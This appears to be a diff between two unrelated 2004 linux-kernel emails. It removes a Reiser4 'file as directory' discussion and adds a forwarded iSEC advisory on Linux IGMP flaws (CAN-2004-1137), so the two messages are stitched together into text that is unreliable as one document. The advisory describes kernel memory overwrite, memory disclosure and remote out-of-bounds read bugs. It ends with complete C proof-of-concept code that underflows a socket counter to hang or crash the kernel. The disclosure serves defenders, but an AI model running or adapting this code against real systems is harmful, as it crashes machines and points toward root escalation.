@@ -1,154 +1,363 @@
-Return-Path: <linux-kernel-owner+willy=40w.ods.org-S261559AbULNRCU@vger.kernel.org>
+Return-Path: <linux-kernel-owner+willy=40w.ods.org-S261555AbULNREj@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S261559AbULNRCU (ORCPT <rfc822;willy@w.ods.org>);
-	Tue, 14 Dec 2004 12:02:20 -0500
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261561AbULNRCT
+	id S261555AbULNREj (ORCPT <rfc822;willy@w.ods.org>);
+	Tue, 14 Dec 2004 12:04:39 -0500
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261561AbULNREi
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Tue, 14 Dec 2004 12:02:19 -0500
-Received: from psych.st-and.ac.uk ([138.251.11.1]:42429 "EHLO
-	psych.st-andrews.ac.uk") by vger.kernel.org with ESMTP
-	id S261559AbULNRAZ (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Tue, 14 Dec 2004 12:00:25 -0500
-Subject: Re: file as a directory
-From: Peter Foldiak <Peter.Foldiak@st-andrews.ac.uk>
-To: Hans Reiser <reiser@namesys.com>
-Cc: reiserfs-list@namesys.com, linux-kernel@vger.kernel.org
-In-Reply-To: <41ACA7C9.1070001@namesys.com>
-References: <200411301631.iAUGVT8h007823@laptop11.inf.utfsm.cl>
-	 <41ACA7C9.1070001@namesys.com>
-Content-Type: text/plain
-Message-Id: <1103043518.21728.159.camel@pear.st-and.ac.uk>
-Mime-Version: 1.0
-X-Mailer: Ximian Evolution 1.2.3 
-Date: 14 Dec 2004 16:58:38 +0000
-Content-Transfer-Encoding: 7bit
-Content-Transfer-Encoding: 7bit
+	Tue, 14 Dec 2004 12:04:38 -0500
+Received: from smtp.dei.uc.pt ([193.137.203.228]:41929 "EHLO smtp.dei.uc.pt")
+	by vger.kernel.org with ESMTP id S261555AbULNRAQ (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Tue, 14 Dec 2004 12:00:16 -0500
+Date: Tue, 14 Dec 2004 16:59:43 +0000 (WET)
+From: "Marcos D. Marado Torres" <marado@student.dei.uc.pt>
+To: linux-kernel@vger.kernel.org
+Subject: Linux kernel IGMP vulnerabilities (fwd)
+Message-ID: <Pine.LNX.4.61.0412141659270.25679@student.dei.uc.pt>
+MIME-Version: 1.0
+Content-Type: TEXT/PLAIN; charset=US-ASCII; format=flowed
+X-UC-FCTUC-DEI-MailScanner-Information: Please contact helpdesk@dei.uc.pt for more information
+X-UC-FCTUC-DEI-MailScanner: Found to be clean
+X-MailScanner-From: marado@student.dei.uc.pt
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Hans,
-Following the recent discussions on the lists on "file as directory", I
-re-read part of your http://www.namesys.com/v4/v4.html paper (in
-sections near "Aggregating Files Can Improve The User Interface To
-Them") and realised that you have discussed this issue in quite a lot of
-detail already there (see copied below). (Strange though that nobody
-referred to it in the discussion! People don't seem to be very good at
-reading (and that seems to include me)).
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-It looks to me that the "file as directory" and "directory as file"
-issues are almost identical. What you are saying is that you could
-automatically aggregate files in a directory to look like a single file
-(you give the example of the /etc/passwd file). I was saying that you
-could make a file look like a directory.
-Perhaps a better way to think about this is that instead of talking
-about directories and files, we just talk about objects. Each object
-would have file-type access methods and directory-type access methods.
-This has some implications for the syntax. You (in v4.html) suggest
-using the /.glued syntax:
+I hope LKML folks know this...
 
-/new_syntax_access_path/big_directory_of_small_files/.glued
+- --
+/* *************************************************************** */
+    Marcos Daniel Marado Torres	     AKA	Mind Booster Noori
+    http://student.dei.uc.pt/~marado   -	  marado@student.dei.uc.pt
+    () Join the ASCII ribbon campaign against html email, Microsoft
+    /\ attachments and Software patents.   They endanger the World.
+    Sign a petition against patents:  http://petition.eurolinux.org
+/* *************************************************************** */
 
-I think the "object" philosophy would rather imply that the object (or
-directory) should have a default glueing method, so when you access the
-directory as a file (using read(), for instance)
+- ---------- Forwarded message ----------
+Date: Tue, 14 Dec 2004 11:31:21 +0100 (CET)
+From: Paul Starzetz <ihaquer@isec.pl>
+Reply-To: security@isec.pl
+To: bugtraq@securityfocus.com, vulnwatch@vulnwatch.org,
+     full-disclosure@lists.netsys.com
+Subject: Linux kernel IGMP vulnerabilities
 
-/new_syntax_access_path/big_directory_of_small_files
 
-would automatically give you the glued file (without having to add the
-.glued !) and when you access it as a directory (using readdir(), for
-instance), you would get the components listed as a directory.
-(I am not sure whether the access method, e.g. read() vs. readdir() is
-sufficient to distinguish the meaning. Another way may be putting a "/"
-after the objectname to indicate that you want it as a directory.)
+Synopsis:  Linux kernel IGMP vulnerabilities
+Product:   Linux kernel
+Version:   2.4 up to and including 2.4.28, 2.6 up to and including 2.6.9
+Vendor:    http://www.kernel.org/
+URL:       http://isec.pl/vulnerabilities/isec-0018-igmp.txt
+CVE:       CAN-2004-1137
+Author:    Paul Starzetz <ihaquer@isec.pl>
+Date:      Dec 14, 2004
 
-If we do this, the applications don't need to know whether they are
-dealing with an object consisting of small files, aggregated, or whether
-they are looking at a big file with some way of accessing their parts.
-If an old application (or user) looks for the /etc/passwd file, it will
-still get what it expects without having to know that the file is an
-aggregate.
 
-In fact, from the point of view of the file system, it doesn't make much
-of a difference, in both cases they map names to keys. The only
-difference (as far as I can see) is whether metadata is stored
-separately for each component or only once for the objcts. 
+Issue:
+======
 
-If you store metadata only once, then a component could inherit metadata
-(such as modification date) from the parent. There should be some way of
-telling the file system which bits need their own metadata. But the way
-of telling the file system this probably should not be mixed up with the
-file naming.
+Multiple locally as well as remotely exploitable bugs have been found in
+the Linux IGMP networking module and the corresponding user API.
 
-There may be some complications with some parts of files being linked to
-a different number of times, so if you remove a hard link from the whole
-file, should a component linked from elsewhere be kept or deleted.
 
-Do you think we could leave off the ./glued bit? Would it break too many
-things?
+Details:
+========
 
- Peter
+The IGMP (or internet group management protocol) is today's standard for
+delivering  multicast  functionality to internet hosts. The Linux kernel
+incorporates a base set of the IGMPv2 and IGMPv3 specifications  and  is
+subdivided into two logical parts:
 
-In http://www.namesys.com/v4/v4.html Hans Reiser wrote:
-> ...
-> Aggregating Files Can Improve The User Interface To Them
-> Consider the use of emacs on a collection of a thousand small 8-32
-byte
-> files like you might have if you deconstructed /etc/passwd into small
-> files with separable acls for every field. It is more convenient in
-> screen real estate, buffer management, and other user interface
-> considerations, to operate on them as an aggregation all placed into a
-> single buffer rather than as a thousand 8-32 byte buffers.
-> 
-> 
-> How Do We Write Modifications To An Aggregation
-> Suppose we create a plugin that aggregates all of the files in a
-> directory into a single stream. How does one handle writes to that
-> aggregation that change the length of the components of that
-> aggregation?
-> 
-> Richard Stallman pointed out to me that if we separate the aggregated
-> files with delimiters, then emacs need not be changed at all to
-acquire
-> an effective interface for large numbers of small files accessed via
-an
-> aggregation plugin. If
-> /new_syntax_access_path/big_directory_of_small_files/.glued is a
-plugin
-> that aggregates every file in big_directory_of_small_files with a
-> delimiter separating every file within the aggregation, then one can
-> simply type emacs
-> /new_syntax_access_path/big_directory_of_small_files/.glued, and the
-> filesystem has done all the work emacs needs to be effective at this.
-> Not a line of emacs needs to be changed.
-> 
-> One needs to be able to choose different delimiting syntax for
-different
-> aggregation plugins so that one can, for say the passwd file,
-aggregate
-> subdirectories into lines, and files within those subdirectories into
-> colon separate fields within the line. XML would benefit from yet
-other
-> delimiter construction rules. (We have been told by Philipp Guehring 
-of
-> LivingXML.NET  that ReiserFS is higher performance than any database
-for
-> storing XML, so this issue is not purely theoretical.)
-> 
-> 
-> Aggregation Is Best Implemented As Inheritance
-> In summary, to be able to achieve precision in security we need to
-have
-> inheritance with specifiable delimiters and we need whole file
-> inheritance to support ACLs.
-> 
-> 
-> One Plugin Using Delimiters That Resemble sys_reiser4() Syntax
-> We provide the infrastructure for your constructing plugins that
-> implement arbitrary processing of writes to inheriting files, but we
-> also supply one generic inheriting file plugin that intentionally uses
-> delimiters very close to the sys_reiser4() syntax. We will document
-the
-> syntax more fully when that code is working, for now syntax details
-are
-> in the comments in the file invert.c in the source code. ...
+- - the IGMP/IP networking module responsible for network level operation,
+that is only compiled into the kernel if configured for multicasting,
+
+- - the socket API delivering  multicasting  capabilities  to  user  level
+applications, which is always available on Linux.
+
+Both parts of the IGMP subsystem have exploitable flaws:
+
+(1) the ip_mc_source() function, that can be called through the user API
+(the  IP_(UN)BLOCK_SOURCE,  IP_ADD/DROP_SOURCE_MEMBERSHIP  as  well   as
+MCAST_(UN)BLOCK_SOURCE  and  MCAST_JOIN/LEAVE_SOURCE_GROUP socket SOL_IP
+level options) suffers from a serious  kernel  hang  and  kernel  memory
+overwrite problem.
+
+It   is   possible   to   decrement   the   'sl_count'  counter  of  the
+'ip_sf_socklist' structure to  be  0xffffffff  (that  is  -1  as  signed
+integer,  see  attached  PoC code) with the consequence, that a repeated
+call to above function will start a  kernel  loop  counting  from  0  to
+UINT_MAX.  This  will  cause a kernel hang for minutes (depending on the
+machine speed).
+
+Right after that the whole  kernel  memory  following  the  kmalloc'ated
+buffer  will  be  shifted by 4 bytes causing an immediate machine reboot
+under normal operating conditions. If properly exploited this will  lead
+to elevated privileges.
+
+(2)  Because  of  the  bug  (1)  it is possible to read huge portions of
+kernel memory following a kernel buffer through the  ip_mc_msfget()  and
+ip_mc_gsfget() (user API) functions.
+
+(3) The igmp_marksources() function from the network module is called in
+the context of an IGMP group query received from the network and suffers
+from  an  out  of bound read access to kernel memory. It happens because
+the received IGMP message's parameters are not validated properly.  This
+flaw is remotely exploitable on Linux machines with multicasting support
+if and only if an application has bound a multicast socket.
+
+
+Discussion:
+=============
+
+(1) It is quite obvious that moving around all kernel memory following a
+kmalloc'ated  buffer  is a bad idea. However if done very carefully this
+may give a local attacker elevated privileges.
+
+We strongly believe that this flaw is very  easily  exploitable  on  SMP
+machines (where one thread can interrupt the copy loop before the kernel
+gets completely destroyed).
+
+On uniprocessor configurations the exploitability is questionable  since
+there  is  no other exit condition from the copy loop than a kernel oops
+if we hit a non existing page. If  an  attacker  manages  to  trick  the
+kernel  to  allocate  the  buffer  just right before the end of kernel's
+physical memory mapping and also manages to place for example a LDT just
+after  that buffer, he may gain elevated privileges also on uniprocessor
+machines.
+
+(2) No special handling is required to exploit this flaw in  conjunction
+with  bug described in (1). This issue is slightly related to the loff_t
+race discovered by iSEC in August 2004. Please refer to
+
+http://www.isec.pl/vulnerabilities/isec-0016-procleaks.txt
+
+for further information about consequences of reading privileged  kernel
+memory.
+
+(3) The last bug described here refers to a remote kernel vulnerability.
+There are several conditions that must be meet for remote  exploitation.
+
+First,  the kernel must have been compiled with multicasting support and
+process incoming IGMP packets. Moreover, an attacker  must  be  able  to
+send   group   queries   (IGMP_HOST_MEMBERSHIP_QUERY  messages)  to  the
+vulnerable machine.
+
+Second requirement is an application on the vulnerable  machine  with  a
+bound  multicast  socket with attached source filter. There are numerous
+applications using  multicasting  like  video  conferencing  or  routing
+software,  just  to name few. The attacker must also know the IGMP group
+used to perform the attack.
+
+You can check if your configuration is vulnerable by  looking  at  these
+files:
+
+/proc/net/igmp
+/proc/net/mcfilter
+
+if both exist and are non-empty you are vulnerable!
+
+Since  the  kernel  does not validate the ih3->nsrcs IGMP parameter, the
+igmp_marksources() internal kernel function  may  access  kernel  memory
+outside  of  the  allocated  socket  buffer  holding  the  IGMP message.
+Depending on the relative position of the socket buffer  in  the  kernel
+memory this may lead to an immediate kernel crash.
+
+Another  consequence  is that the kernel will spend most of the CPU time
+on scanning useless kernel data right after  the  buffer  if  the  nsrcs
+parameter is very high. If a continuous flow of prepared IGMP packets is
+sent to a vulnerable machine, it  may  stop  to  process  other  network
+traffic.  For  an  average  machine  only a moderate IGMP packet flow is
+required. This may lead to serious problems in case of routing software.
+
+
+Impact:
+=======
+
+Unprivileged  local  users  may  gain elevated (root) privileges. Remote
+users may hang or even crash a vulnerable Linux machine.
+
+
+Credits:
+========
+
+Paul Starzetz <ihaquer@isec.pl> has  identified  the  vulnerability  and
+performed  further  research. COPYING, DISTRIBUTION, AND MODIFICATION OF
+INFORMATION PRESENTED HERE IS ALLOWED ONLY WITH  EXPRESS  PERMISSION  OF
+ONE OF THE AUTHORS.
+
+
+Disclaimer:
+===========
+
+This  document and all the information it contains are provided "as is",
+for educational purposes only, without warranty  of  any  kind,  whether
+express or implied.
+
+The  authors reserve the right not to be responsible for the topicality,
+correctness, completeness or quality of  the  information   provided  in
+this  document.  Liability  claims regarding damage caused by the use of
+any information provided, including any kind  of  information  which  is
+incomplete or incorrect, will therefore be rejected.
+
+
+Appendix:
+=========
+
+/*
+  * Linux igmp.c local DoS
+  * Warning: this code will crash your machine!
+  *
+  * gcc -O2 mreqfck.c -o mreqfck
+  *
+  * Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
+  *
+  * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
+  * AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
+  * WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
+  *
+  */
+
+#include <stdio.h>
+#include <unistd.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <linux/types.h>
+
+
+#define MCAST_INCLUDE    		1
+#define IP_MSFILTER                     41
+
+#define IP_UNBLOCK_SOURCE		37
+#define IP_BLOCK_SOURCE			38
+
+
+struct ip_msfilter
+{
+     __u32 imsf_multiaddr;
+     __u32 imsf_interface;
+     __u32 imsf_fmode;
+     __u32 imsf_numsrc;
+     __u32 imsf_slist[1];
+};
+
+struct ip_mreq_source
+{
+     __u32 imr_multiaddr;
+     __u32 imr_interface;
+     __u32 imr_sourceaddr;
+};
+
+
+void
+fatal (const char *message)
+{
+     printf ("\n");
+     if (!errno)
+       {
+ 	  fprintf (stdout, "FATAL: %s\n", message);
+       }
+     else
+       {
+ 	  fprintf (stdout, "FATAL: %s (%s) ", message,
+ 		   (char *) (strerror (errno)));
+       }
+     printf ("\n");
+     fflush (stdout);
+     exit (1);
+}
+
+
+int
+main ()
+{
+     int s, r, l;
+     struct ip_mreqn mr;
+     struct ip_msfilter msf;
+     struct ip_mreq_source ms;
+     in_addr_t a1, a2;
+
+     s = socket (AF_INET, SOCK_DGRAM, 0);
+     if (s < 0)
+ 	fatal ("socket");
+
+//      first join mcast group
+     memset (&mr, 0, sizeof (mr));
+     mr.imr_multiaddr.s_addr = inet_addr ("224.0.0.199");
+     l = sizeof (mr);
+     r = setsockopt (s, SOL_IP, IP_ADD_MEMBERSHIP, &mr, l);
+     if (r < 0)
+ 	fatal ("setsockopt");
+
+//      add source filter count=1
+     memset (&ms, 0, sizeof (ms));
+     ms.imr_multiaddr = inet_addr ("224.0.0.199");
+     ms.imr_sourceaddr = inet_addr ("4.5.6.7");
+     l = sizeof (ms);
+     r = setsockopt (s, SOL_IP, IP_BLOCK_SOURCE, &ms, l);
+     if (r < 0)
+ 	fatal ("setsockopt2");
+
+//      del source filter count = 0
+//      imr_multiaddr & imr_interface must correspond to ADD
+     memset (&ms, 0, sizeof (ms));
+     ms.imr_multiaddr = inet_addr ("224.0.0.199");
+     ms.imr_sourceaddr = inet_addr ("4.5.6.7");
+     l = sizeof (ms);
+     r = setsockopt (s, SOL_IP, IP_UNBLOCK_SOURCE, &ms, l);
+     if (r < 0)
+ 	fatal ("setsockopt2");
+
+//      del again, count = -1
+     memset (&ms, 0, sizeof (ms));
+     ms.imr_multiaddr = inet_addr ("224.0.0.199");
+     ms.imr_sourceaddr = inet_addr ("4.5.6.7");
+     l = sizeof (ms);
+     r = setsockopt (s, SOL_IP, IP_UNBLOCK_SOURCE, &ms, l);
+     if (r < 0)
+ 	fatal ("setsockopt3");
+
+//      crash
+     memset (&ms, 0, sizeof (ms));
+     ms.imr_multiaddr = inet_addr ("224.0.0.199");
+     ms.imr_sourceaddr = inet_addr ("4.5.6.7");
+     l = sizeof (ms);
+     r = setsockopt (s, SOL_IP, IP_UNBLOCK_SOURCE, &ms, l);
+     if (r < 0)
+ 	fatal ("setsockopt4");
+
+     getchar ();
+
+     return 0;
+}
+
+- --
+Paul Starzetz
+iSEC Security Research
+http://isec.pl/
+
+
+- ------------ Output from gpg ------------
+gpg: WARNING: using insecure memory!
+gpg: please see http://www.gnupg.org/faq.html for more information
+gpg: Signature made Tue 14 Dec 2004 10:31:26 AM WET using DSA key ID 9E70A6EE
+gpg: Can't check signature: public key not found
+
+
+- ------------ Output from gpg ------------
+gpg: WARNING: using insecure memory!
+gpg: please see http://www.gnupg.org/faq.html for more information
+gpg: Signature made Tue 14 Dec 2004 04:51:15 PM WET using DSA key ID 6FA80F7E
+gpg: Good signature from "Mind Booster Noori <marado@student.dei.uc.pt>"
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.2.1 (GNU/Linux)
+Comment: Made with pgp4pine 1.76
+
+iD8DBQFBvxwBmNlq8m+oD34RAqnIAJwJSycH7IE2QyIENzJ8y9xkQFNHIgCcC/Q4
+q/3yOY1V8sYxnBLm0bWN6dE=
+=Ehh+
+-----END PGP SIGNATURE-----
 
